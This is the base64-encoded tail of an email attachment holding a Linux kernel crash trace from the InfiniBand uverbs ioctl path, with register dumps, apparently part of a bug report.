W2liX3V2ZXJic19zdXBwb3J0XQ0KW+aXpSAxMOaciCAgNCAyMTozMjo0NCAyMDI2XSAgdW9ial9k
ZXN0cm95KzB4NzAvMHhmMCBbaWJfdXZlcmJzX3N1cHBvcnRdDQpb5pelIDEw5pyIICA0IDIxOjMy
OjQ0IDIwMjZdICBpYl91dmVyYnNfY21kX3ZlcmJzKzB4Y2YxLzB4MzMwMCBbaWJfdXZlcmJzXQ0K
W+aXpSAxMOaciCAgNCAyMTozMjo0NCAyMDI2XSAgPyBfX3BmeF91dmVyYnNfZGVzdHJveV9kZWZf
aGFuZGxlcisweDEwLzB4MTAgW2liX2NvcmVdDQpb5pelIDEw5pyIICA0IDIxOjMyOjQ0IDIwMjZd
ICA/IF9fdHR5X2luc2VydF9mbGlwX3N0cmluZ19mbGFncysweGZkLzB4MzUwDQpb5pelIDEw5pyI
ICA0IDIxOjMyOjQ0IDIwMjZdICA/IF9fcGZ4X2liX3V2ZXJic19jbWRfdmVyYnMrMHgxMC8weDEw
IFtpYl91dmVyYnNdDQpb5pelIDEw5pyIICA0IDIxOjMyOjQ0IDIwMjZdICA/IHF1ZXVlX3dvcmtf
b24rMHgzNC8weDgwDQpb5pelIDEw5pyIICA0IDIxOjMyOjQ0IDIwMjZdICA/IHF1ZXVlX3dvcmtf
b24rMHg3My8weDgwDQpb5pelIDEw5pyIICA0IDIxOjMyOjQ0IDIwMjZdICBpYl91dmVyYnNfaW9j
dGwrMHgxNTUvMHgyMzAgW2liX3V2ZXJic10NClvml6UgMTDmnIggIDQgMjE6MzI6NDQgMjAyNl0g
ID8gX19wZnhfaWJfdXZlcmJzX2lvY3RsKzB4MTAvMHgxMCBbaWJfdXZlcmJzXQ0KW+aXpSAxMOac
iCAgNCAyMTozMjo0NCAyMDI2XSAgPyBfX3BmeF9sZHNlbV9kb3duX3JlYWQrMHgxMC8weDEwDQpb
5pelIDEw5pyIICA0IDIxOjMyOjQ0IDIwMjZdICBfX3g2NF9zeXNfaW9jdGwrMHgxM2MvMHgxYzAN
Clvml6UgMTDmnIggIDQgMjE6MzI6NDQgMjAyNl0gIGRvX3N5c2NhbGxfNjQrMHhlMS8weDY1MA0K
W+aXpSAxMOaciCAgNCAyMTozMjo0NCAyMDI2XSAgPyBfX3dha2VfdXArMHg0NC8weDYwDQpb5pel
IDEw5pyIICA0IDIxOjMyOjQ0IDIwMjZdICA/IGxkc2VtX3VwX3JlYWQrMHgxNy8weDYwDQpb5pel
IDEw5pyIICA0IDIxOjMyOjQ0IDIwMjZdICA/IGZpbGVfdHR5X3dyaXRlLmlzcmEuMCsweDRhZC8w
eDc5MA0KW+aXpSAxMOaciCAgNCAyMTozMjo0NCAyMDI2XSAgPyB2ZnNfd3JpdGUrMHg1NTQvMHhk
ZTANClvml6UgMTDmnIggIDQgMjE6MzI6NDQgMjAyNl0gID8gX19wZnhfdmZzX3dyaXRlKzB4MTAv
MHgxMA0KW+aXpSAxMOaciCAgNCAyMTozMjo0NCAyMDI2XSAgPyBkb19zeXNjYWxsXzY0KzB4MTFl
LzB4NjUwDQpb5pelIDEw5pyIICA0IDIxOjMyOjQ0IDIwMjZdICA/IGNvbW1vbl9uc2xlZXArMHg2
Yi8weGQwDQpb5pelIDEw5pyIICA0IDIxOjMyOjQ0IDIwMjZdICA/IGZkZ2V0X3BvcysweDUzLzB4
NWUwDQpb5pelIDEw5pyIICA0IDIxOjMyOjQ0IDIwMjZdICA/IGtzeXNfd3JpdGUrMHgxMDIvMHgy
MDANClvml6UgMTDmnIggIDQgMjE6MzI6NDQgMjAyNl0gID8gX19wZnhfa3N5c193cml0ZSsweDEw
LzB4MTANClvml6UgMTDmnIggIDQgMjE6MzI6NDQgMjAyNl0gID8gX19wZnhfX194NjRfc3lzX2Ns
b2NrX25hbm9zbGVlcCsweDEwLzB4MTANClvml6UgMTDmnIggIDQgMjE6MzI6NDQgMjAyNl0gID8g
ZnByZWdzX2Fzc2VydF9zdGF0ZV9jb25zaXN0ZW50KzB4NWIvMHhmMA0KW+aXpSAxMOaciCAgNCAy
MTozMjo0NCAyMDI2XSAgPyBkb19zeXNjYWxsXzY0KzB4MTFlLzB4NjUwDQpb5pelIDEw5pyIICA0
IDIxOjMyOjQ0IDIwMjZdICA/IGRvX3N5c2NhbGxfNjQrMHgyOGUvMHg2NTANClvml6UgMTDmnIgg
IDQgMjE6MzI6NDQgMjAyNl0gID8gZG9fc3lzY2FsbF82NCsweDk4LzB4NjUwDQpb5pelIDEw5pyI
ICA0IDIxOjMyOjQ0IDIwMjZdICA/IGNsZWFyX2JoYl9sb29wKzB4NDAvMHg5MA0KW+aXpSAxMOac
iCAgNCAyMTozMjo0NCAyMDI2XSAgZW50cnlfU1lTQ0FMTF82NF9hZnRlcl9od2ZyYW1lKzB4NzYv
MHg3ZQ0KW+aXpSAxMOaciCAgNCAyMTozMjo0NCAyMDI2XSBSSVA6IDAwMzM6MHg3ZjRiOTc4YTMx
ZGINClvml6UgMTDmnIggIDQgMjE6MzI6NDQgMjAyNl0gQ29kZTogMDAgNDggODkgNDQgMjQgMTgg
MzEgYzAgNDggOGQgNDQgMjQgNjAgYzcgMDQgMjQgMTAgMDAgMDAgMDAgNDggODkgNDQgMjQgMDgg
NDggOGQgNDQgMjQgMjAgNDggODkgNDQgMjQgMTAgYjggMTAgMDAgMDAgMDAgMGYgMDUgPDg5PiBj
MiAzZCAwMCBmMCBmZiBmZiA3NyAxYyA0OCA4YiA0NCAyNCAxOCA2NCA0OCAyYiAwNCAyNSAyOCAw
MCAwMA0KW+aXpSAxMOaciCAgNCAyMTozMjo0NCAyMDI2XSBSU1A6IDAwMmI6MDAwMDdmZmY3MjI2
MTg2MCBFRkxBR1M6IDAwMDAwMjQ2IE9SSUdfUkFYOiAwMDAwMDAwMDAwMDAwMDEwDQpb5pelIDEw
5pyIICA0IDIxOjMyOjQ0IDIwMjZdIFJBWDogZmZmZmZmZmZmZmZmZmZkYSBSQlg6IDAwMDA3ZmZm
NzIyNjE5ZDggUkNYOiAwMDAwN2Y0Yjk3OGEzMWRiDQpb5pelIDEw5pyIICA0IDIxOjMyOjQ0IDIw
MjZdIFJEWDogMDAwMDdmZmY3MjI2MTljMCBSU0k6IDAwMDAwMDAwYzAxODFiMDEgUkRJOiAwMDAw
MDAwMDAwMDAwMDAzDQpb5pelIDEw5pyIICA0IDIxOjMyOjQ0IDIwMjZdIFJCUDogMDAwMDdmZmY3
MjI2MTlhMCBSMDg6IDAwMDA1NWIwZjRmYjBlZjAgUjA5OiAwMDAwNTViMGY0ZmIwZDgwDQpb5pel
IDEw5pyIICA0IDIxOjMyOjQ0IDIwMjZdIFIxMDogMDAwMDAwMDAwMDAwMDAwMCBSMTE6IDAwMDAw
MDAwMDAwMDAyNDYgUjEyOiAwMDAwN2ZmZjcyMjYxOTkwDQpb5pelIDEw5pyIICA0IDIxOjMyOjQ0
IDIwMjZdIFIxMzogMDAwMDAwMDAwMDAwMDAwMCBSMTQ6IDAwMDA3ZmZmNzIyNjE5YTAgUjE1OiAw
MDAwMDAwMDAwMDAwMDFmDQpb5pelIDEw5pyIICA0IDIxOjMyOjQ0IDIwMjZdICA8L1RBU0s+DQpb
5pelIDEw5pyIICA0IDIxOjMyOjQ0IDIwMjZdIC0tLVsgZW5kIHRyYWNlIDAwMDAwMDAwMDAwMDAw
MDAgXS0tLQ==

--_005_SY7P300MB0292E9E08F0890A2C31CFD96DE972SY7P300MB0292AUSP_--
